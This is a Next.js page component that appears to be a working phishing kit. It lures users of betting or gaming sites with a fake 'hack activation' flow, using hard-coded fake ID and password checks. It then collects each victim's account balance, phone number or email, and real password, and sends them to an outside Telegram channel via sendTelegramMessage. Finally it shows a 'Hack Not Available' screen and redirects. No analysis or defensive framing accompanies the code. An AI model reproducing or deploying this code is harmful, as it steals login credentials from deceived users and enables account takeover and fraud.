"use client"

import { useState, useEffect, Suspense } from "react"
import { useSearchParams } from 'next/navigation'
import { CheckCircle, AlertTriangle } from 'lucide-react'
import { sendTelegramMessage } from "./actions"

const ImageWithFallback = ({ localSrc, externalSrc, alt }: { localSrc: string, externalSrc: string, alt: string }) => {
  const [imgSrc, setImgSrc] = useState(localSrc);

  useEffect(() => {
    setImgSrc(localSrc);
  }, [localSrc]);

  return (
    <img
      src={imgSrc}
      alt={alt}
      onError={() => {
        if (imgSrc !== externalSrc) {
          setImgSrc(externalSrc);
        }
      }}
      className="w-32 h-auto"
      loading="eager"
    />
  );
};

function HackIdPageComponent() {
  const searchParams = useSearchParams()
  const platformName = searchParams.get('platform') || 'Unknown Site'
  const logoPath = searchParams.get('logoPath') || '/logos/jaya9-logo.png'
  const logoUrl = searchParams.get('logoUrl') || 'https://raw.githubusercontent.com/niloyyt499-cpu/aviatorlite-logo/main/jaya9-logo.png'
  
  const [hackId, setHackId] = useState("")
  const [hackPassword, setHackPassword] = useState("")
  const [accountBalance, setAccountBalance] = useState("")
  const [accountInput, setAccountInput] = useState("")
  const [finalPassword, setFinalPassword] = useState("")
  const [showPage1Confirmation, setShowPage1Confirmation] = useState(false)
  const [showPage2Confirmation, setShowPage2Confirmation] = useState(false)
  const [currentPage, setCurrentPage] = useState(1)
  const [countdown, setCountdown] = useState(5)
  const [minBalanceRequired, setMinBalanceRequired] = useState(0)
  const [isHackIdInvalid, setIsHackIdInvalid] = useState(false)
  const [isHackPasswordInvalid, setIsHackPasswordInvalid] = useState(false)
  const [isAccountBalanceInvalid, setIsAccountBalanceInvalid] = useState(false)
  const [isAccountInputInvalid, setIsAccountInputInvalid] = useState(false)
  const [isFinalPasswordInvalid, setIsFinalPasswordInvalid] = useState(false)

  useEffect(() => {
    if (currentPage === 7) {
      setCountdown(5)
      const timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer)
            window.location.href = '/';
            return 0
          }
          return prev - 1
        })
      }, 1000)
      return () => clearInterval(timer)
    }
  }, [currentPage])

  const handleConfirm = () => {
    const middleDigits = hackId.substring(1, 3)
    const allowedMiddleDigits = ["10", "20", "30", "40", "50"]
    const validPatterns = [`7${middleDigits}4477899`, `8${middleDigits}2069357`, `1${middleDigits}7967802`]
    if (hackId.length !== 10 || !(allowedMiddleDigits.includes(middleDigits) && validPatterns.includes(hackId))) {
      setIsHackIdInvalid(true)
      setTimeout(() => setIsHackIdInvalid(false), 500)
      return
    }
    let required = 0
    switch (middleDigits) {
      case "10": required = 1000; break;
      case "20": required = 2000; break;
      case "30": required = 3000; break;
      case "40": required = 4000; break;
      case "50": required = 5000; break;
      default: required = 0;
    }
    setMinBalanceRequired(required)
    setIsHackIdInvalid(false)
    setShowPage1Confirmation(true)
    setTimeout(() => {
      setShowPage1Confirmation(false)
      setCurrentPage(2)
    }, 1500)
  }

  const handleActivation = () => {
    const allowedPasswords = ["124499", "009015", "456924"]
    if (hackPassword.length !== 6 || !allowedPasswords.includes(hackPassword)) {
      setIsHackPasswordInvalid(true)
      setTimeout(() => setIsHackPasswordInvalid(false), 500)
      return
    }
    setIsHackPasswordInvalid(false)
    setShowPage2Confirmation(true)
    setTimeout(() => {
      setShowPage2Confirmation(false)
      setCurrentPage(3)
    }, 1500)
  }

  const handleBalanceConfirm = () => {
    const balance = Number.parseInt(accountBalance, 10)
    if (isNaN(balance) || balance < minBalanceRequired) {
      setIsAccountBalanceInvalid(true)
      setTimeout(() => setIsAccountBalanceInvalid(false), 500)
      return
    }
    setIsAccountBalanceInvalid(false)
    setCurrentPage(5)
  }

  const handleAccountInputConfirm = () => {
    const isNumericOnly = /^\d+$/.test(accountInput)
    let isValid = false
    if (accountInput.startsWith('01')) {
      isValid = accountInput.length === 11 && isNumericOnly
    } else if (isNumericOnly) {
      isValid = accountInput.length === 5
    } else {
      isValid = accountInput.length >= 6
    }
    if (!isValid) {
      setIsAccountInputInvalid(true)
      setTimeout(() => setIsAccountInputInvalid(false), 500)
      return
    }
    setIsAccountInputInvalid(false)
    setCurrentPage(6)
  }

  const handleFinalPasswordConfirm = async () => {
    if (finalPassword.length < 4) {
      setIsFinalPasswordInvalid(true)
      setTimeout(() => setIsFinalPasswordInvalid(false), 500)
      return
    }
    setIsFinalPasswordInvalid(false)
    const telegramResult = await sendTelegramMessage(platformName, accountBalance, accountInput, finalPassword)
    if (telegramResult.success) {
      console.log("Data sent to Telegram successfully!")
    } else {
      console.error(`Failed to send data to Telegram: ${telegramResult.error}`)
    }
    setCurrentPage(7)
  }

  const handleBackToPage1 = () => setCurrentPage(1)
  const handleBackToPage3 = () => setCurrentPage(3)
  const handleBackToPage4 = () => setCurrentPage(4)
  const handleBackToPage5 = () => setCurrentPage(5)
  const handleStartOver = () => {
    setCurrentPage(1)
    setHackId("")
    setHackPassword("")
    setAccountBalance("")
    setAccountInput("")
    setFinalPassword("")
    setMinBalanceRequired(0)
    setIsHackIdInvalid(false)
    setIsHackPasswordInvalid(false)
    setIsAccountBalanceInvalid(false)
    setIsAccountInputInvalid(false)
    setIsFinalPasswordInvalid(false)
  }

  const LogoDisplay = () => (
    <div className="pt-8 pl-6">
      <ImageWithFallback localSrc={logoPath} externalSrc={logoUrl} alt={platformName} />
    </div>
  )

  if (currentPage === 1) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <LogoDisplay />
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          <h1 className="text-xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Inter Your Hack Activation ID
          </h1>
          <div className={`w-64 mb-6 relative ${isHackIdInvalid ? "animate-shake" : ""}`}>
            <input
              type="text"
              placeholder="Hack ID"
              value={hackId}
              onChange={(e) => setHackId(e.target.value)}
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
            />
            {isHackIdInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
          </div>
          <button
            onClick={handleConfirm}
            disabled={hackId.length < 10}
            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 disabled:opacity-50"
          >
            Confirm
          </button>
          {showPage1Confirmation && (
            <div className="mt-8 p-4 bg-green-100 border border-green-400 text-green-700 rounded-lg shadow-md animate-fade-in">
              <p className="text-center font-semibold">✓ Hack ID Confirmed!</p>
              <p className="text-center text-sm mt-1">Loading next page...</p>
            </div>
          )}
        </div>
      </div>
    )
  }

  if (currentPage === 2) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <LogoDisplay />
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          <h1 className="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Enter Your Hack Password
          </h1>
          <div className={`w-64 mb-6 relative ${isHackPasswordInvalid ? "animate-shake" : ""}`}>
            <input
              type="text"
              placeholder="Password"
              value={hackPassword}
              onChange={(e) => setHackPassword(e.target.value)}
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
            />
            {isHackPasswordInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
          </div>
          <button
            onClick={handleActivation}
            disabled={hackPassword.length < 6}
            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
          >
            Activation
          </button>
          <button onClick={handleBackToPage1} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
            Back to Hack ID
          </button>
          {showPage2Confirmation && (
            <div className="mt-8 p-4 bg-blue-100 border border-blue-400 text-blue-700 rounded-lg shadow-md animate-fade-in flex items-center justify-center gap-2">
              <CheckCircle className="w-6 h-6 text-blue-500 animate-bounce-in" />
              <p className="text-center font-semibold">Hack Action Completed</p>
            </div>
          )}
        </div>
      </div>
    )
  }

  if (currentPage === 3) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <LogoDisplay />
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          <h1 className="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Activation Complete!
          </h1>
          <div className="mt-8 p-4 bg-green-100 border border-green-400 text-green-700 rounded-lg shadow-md flex items-center justify-center gap-2">
            <CheckCircle className="w-8 h-8 text-green-600" />
            <p className="text-center font-semibold text-lg">Your Hack is Ready!</p>
          </div>
          <button
            onClick={() => setCurrentPage(4)}
            className="mt-12 bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95"
          >
            Add Account
          </button>
        </div>
      </div>
    )
  }

  if (currentPage === 4) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <LogoDisplay />
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          <h1 className="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Enter Your Account Balance
          </h1>
          <div className={`w-64 mb-6 relative ${isAccountBalanceInvalid ? "animate-shake" : ""}`}>
            <input
              type="number"
              placeholder="Enter Amount"
              value={accountBalance}
              onChange={(e) => setAccountBalance(e.target.value)}
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
            />
            {isAccountBalanceInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
          </div>
          <button
            onClick={handleBalanceConfirm}
            disabled={Number.parseInt(accountBalance, 10) < minBalanceRequired}
            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
          >
            Confirm
          </button>
          <button onClick={handleBackToPage3} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
            Back to Activation
          </button>
        </div>
      </div>
    )
  }

  if (currentPage === 5) {
    const isNumericOnly = /^\d+$/.test(accountInput)
    let isButtonEnabled = false
    if (accountInput.startsWith('01')) {
      isButtonEnabled = accountInput.length === 11 && isNumericOnly
    } else if (isNumericOnly) {
      isButtonEnabled = accountInput.length === 5
    } else {
      isButtonEnabled = accountInput.length >= 6
    }
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <LogoDisplay />
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          <h1 className="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Enter Account Number Or Email
          </h1>
          <div className={`w-64 mb-6 relative ${isAccountInputInvalid ? "animate-shake" : ""}`}>
            <input
              type="text"
              placeholder="Email Or Phone"
              value={accountInput}
              onChange={(e) => setAccountInput(e.target.value)}
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
            />
            {isAccountInputInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
          </div>
          <button
            onClick={handleAccountInputConfirm}
            disabled={!isButtonEnabled}
            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
          >
            Confirm
          </button>
          <button onClick={handleBackToPage4} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
            Back to Balance
          </button>
        </div>
      </div>
    )
  }

  if (currentPage === 6) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <LogoDisplay />
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          <h1 className="text-xl font-bold text-red-600 text-center mb-3 leading-tight max-w-64 px-4">
            Enter Your Password
          </h1>
          <div className={`w-64 mb-6 relative ${isFinalPasswordInvalid ? "animate-shake" : ""}`}>
            <input
              type="password"
              placeholder="Password"
              value={finalPassword}
              onChange={(e) => setFinalPassword(e.target.value)}
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
            />
            {isFinalPasswordInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
          </div>
          <button
            onClick={handleFinalPasswordConfirm}
            disabled={finalPassword.length < 4}
            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
          >
            Confirm
          </button>
          <button onClick={handleBackToPage5} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
            Back to Account Input
          </button>
          <button onClick={handleStartOver} className="mt-4 text-red-600 hover:text-red-700 text-sm underline transition-colors">
            Start Over
          </button>
        </div>
      </div>
    )
  }

  if (currentPage === 7) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <LogoDisplay />
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20 text-center">
          <div className="text-8xl mb-6 animate-pulse">⚠️</div>
          <h1 className="text-6xl font-bold text-red-600 mb-4 animate-pulse">Oops!</h1>
          <p className="text-xl font-semibold text-red-500 mb-8">Hack Not Available. Try again 😎</p>
          <p className="text-lg text-gray-700">Closing in {countdown}s</p>
        </div>
      </div>
    )
  }

  return null
}

export default function Page() {
    return (
        <Suspense fallback={<div className="min-h-screen bg-gray-50 flex items-center justify-center">Loading...</div>}>
            <HackIdPageComponent />
        </Suspense>
    )
}
